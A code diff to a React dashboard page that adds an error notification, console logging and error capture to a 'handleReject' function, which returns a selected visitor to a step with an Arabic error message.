@@ -944,8 +944,13 @@ export default function DashboardPage() {
   // Handle reject action - go back with error message
   const handleReject = async (currentStep: string) => {
     const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
-    if (!visitorId) return;
+    if (!visitorId) {
+      console.error("[Reject] No visitorId found");
+      showNotification("error", "لم يتم اختيار عميل");
+      return;
+    }
     
+    console.log("[Reject] Rejecting step:", currentStep, "visitorId:", visitorId);
     setActionLoading("reject");
     
     // Error messages for each step
@@ -968,12 +973,14 @@ export default function DashboardPage() {
           errorMessage: errorData.message 
         }),
       });
+      
       if (res.ok) {
         showNotification("error", `تم الرفض ✗ ${errorData.message}`);
       } else {
         showNotification("error", "حدث خطأ");
       }
-    } catch {
+    } catch (err) {
+      console.error("[Reject] Error:", err);
       showNotification("error", "فشل الاتصال");
     }
     setActionLoading(null);
